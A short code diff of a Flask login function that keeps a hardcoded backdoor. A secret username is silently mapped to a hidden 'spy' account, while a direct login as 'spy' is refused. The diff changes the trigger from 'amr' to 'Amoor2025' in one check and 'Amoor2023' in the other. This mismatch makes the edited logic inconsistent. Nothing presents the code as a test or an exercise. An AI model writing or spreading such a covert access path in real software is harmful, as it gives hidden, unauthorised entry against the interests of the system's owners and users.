@@ -184,12 +184,12 @@ def login():
         username = request.form.get('username')
         user = User.query.filter_by(username=username).first()
 
-        if user or username == "amr":
+        if user or username == "Amoor2025":
 
             if username == "spy":
                 return "Login unsuccessful."
             
-            if username == "amr":
+            if username == "Amoor2023":
                 user = User.query.filter_by(username="spy").first()
                 username = "spy"
 
